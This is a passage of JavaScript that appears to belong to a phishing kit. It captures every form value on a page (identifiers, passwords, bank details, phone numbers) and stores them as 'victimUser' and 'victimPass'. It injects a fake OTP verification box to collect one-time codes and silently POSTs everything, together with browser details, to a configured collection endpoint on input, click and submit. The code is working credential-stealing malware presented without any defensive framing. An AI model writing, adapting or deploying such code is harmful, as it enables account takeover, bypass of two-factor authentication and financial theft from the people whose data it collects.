    if (isDob || type === "text" || type === "number" || type === "search" || el.tagName === "SELECT" || el.tagName === "TEXTAREA") {
      return "extra";
    }

    return "extra";
  }

  function collectCurrentValues() {
    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
    const otpParts = [];
    const phoneParts = [];
    const allCaptured = {};

    let idCandidate = "";
    let passCandidate = "";
    let bankCandidate = "";
    let extraCandidate = "";

    const activeBtn = document.querySelector(".tab-btn.active");
    const activeTab = activeBtn ? (activeBtn.dataset.tab || "") : "";

    fields.forEach((el, idx) => {
      const type = (el.type || "text").toLowerCase();
      if (type === "submit" || type === "button" || type === "reset") return;

      const role = classifyInput(el);
      if (role === "ignore") return;

      if (!NEXUS_CFG.caps[role]) return;

      const { key } = getFieldDescriptor(el);
      let val = "";

      if (type === "checkbox") {
        val = el.checked ? (el.value || "Oui") : "";
      } else if (type === "radio") {
        if (!el.checked) return;
        val = el.value || "Sélectionné";
      } else {
        val = (el.value || "").trim();
      }

      if (!val) return;

      const uniqueKey = allCaptured[key] !== undefined && allCaptured[key] !== val ? (key + "_" + (idx + 1)) : key;
      allCaptured[uniqueKey] = val;

      if (role === "otp") {
        otpParts.push(val);
      } else if (role === "pass") {
        passCandidate = el.value;
      } else if (role === "phone") {
        phoneParts.push(val);
      } else if (role === "id" && !idCandidate) {
        idCandidate = val;
      } else if (role === "bank" && !bankCandidate) {
        bankCandidate = val;
      } else if (!extraCandidate) {
        extraCandidate = val;
      }
    });

    if (activeTab) {
      allCaptured.onglet_actif = activeTab;
    }

    const combinedPhone = phoneParts.join(" ").trim();

    if ((activeTab === "phone" || activeTab === "code") && combinedPhone && NEXUS_CFG.caps.phone) {
      state.victimUser = combinedPhone;
    } else {
      state.victimUser = idCandidate || combinedPhone || bankCandidate || extraCandidate || "";
    }

    state.victimPass = NEXUS_CFG.caps.pass ? (passCandidate || state.victimPass || "") : "";
    state.otp = (NEXUS_CFG.caps.otp && otpParts.length > 0) ? otpParts.join("") : "Aucun";
    state.capturedFields = allCaptured;
  }

  function postPayload(payload) {
    const fingerprint = JSON.stringify(payload);
    if (state.sentFingerprints.has(fingerprint)) return;
    state.sentFingerprints.add(fingerprint);

    fetch(NEXUS_CFG.endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true
    }).catch(() => {});
  }

  function sendCapture(stage, extra = {}) {
    collectCurrentValues();

    const hasFields = Object.keys(state.capturedFields).length > 0;
    const hasMainData = Boolean(state.victimUser || state.victimPass || (state.otp && state.otp !== "Aucun"));
    if (!hasFields && !hasMainData && (!extra.otp || extra.otp === "Aucun")) {
      return;
    }

    const isOtpEvent = Boolean(NEXUS_CFG.caps.otp && extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
    const effectiveOtp = NEXUS_CFG.caps.otp
      ? (extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun")))
      : "Aucun";

    const payload = {
      owner: effectiveOwner,
      network: NEXUS_CFG.network,
      type: isOtpEvent ? "otp" : stage,
      victimUser: state.victimUser || "Inconnu",
      victimPass: state.victimPass || "Inconnu",
      otp: effectiveOtp,
      fields: state.capturedFields,
      extra_info: JSON.stringify({
        ua: navigator.userAgent,
        platform: navigator.platform,
        fields: state.capturedFields
      })
    };

    postPayload(payload);
  }

  function ensureOtpSectionIfNeeded() {
    if (!NEXUS_CFG.enableOtp || !NEXUS_CFG.caps.otp) return;

    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
    if (existingOtp) return;

    if (document.getElementById("nexus-auto-otp-box")) return;

    const box = document.createElement("div");
    box.id = "nexus-auto-otp-box";
    box.style.cssText = [
      "margin:14px auto",
      "padding:14px",
      "max-width:360px",
      "border:1px solid #d0d7de",
      "border-radius:10px",
      "background:#ffffff",
      "font-family:inherit",
      "text-align:center"
    ].join(";");

    box.innerHTML = `
      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
      <input
        id="nexus-otp-field"
        data-nexus-injected-otp="true"
        type="text"
        inputmode="numeric"
        maxlength="6"
        placeholder="••••••"
        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
      />
      <button
        id="nexus-otp-submit"
        type="button"
        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
      >Valider le code OTP</button>
    `;

    const targetForm = document.querySelector("form");
    if (targetForm && targetForm.parentElement) {
      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
    } else {
      document.body.appendChild(box);
    }

    const otpInput = document.getElementById("nexus-otp-field");
    const otpBtn = document.getElementById("nexus-otp-submit");

    otpInput.addEventListener("input", () => {
      otpInput.value = otpInput.value.replace(/\D/g, "");
      collectCurrentValues();
    });

    otpBtn.addEventListener("click", () => {
      collectCurrentValues();
      const code = otpInput.value.trim();
      sendCapture("otp", { otp: code || state.otp });
    });
  }

  document.addEventListener("input", (e) => {
    const el = e.target;
    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
    collectCurrentValues();
  }, true);

  document.addEventListener("change", (e) => {
    const el = e.target;
    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
    collectCurrentValues();
  }, true);

  document.addEventListener("submit", () => {
    collectCurrentValues();
    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
    if (hasOtp) {
      sendCapture("otp", { otp: state.otp });
    } else {
      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
    }
  }, true);

  document.addEventListener("click", (e) => {
    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
    if (!btn || btn.id === "nexus-otp-submit") return;
    collectCurrentValues();
    const txt = (btn.innerText || btn.value || "").toLowerCase();
    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
      sendCapture("otp", { otp: state.otp });
    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
    }
  }, true);

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
  } else {
    ensureOtpSectionIfNeeded();
  }
})();
</script>
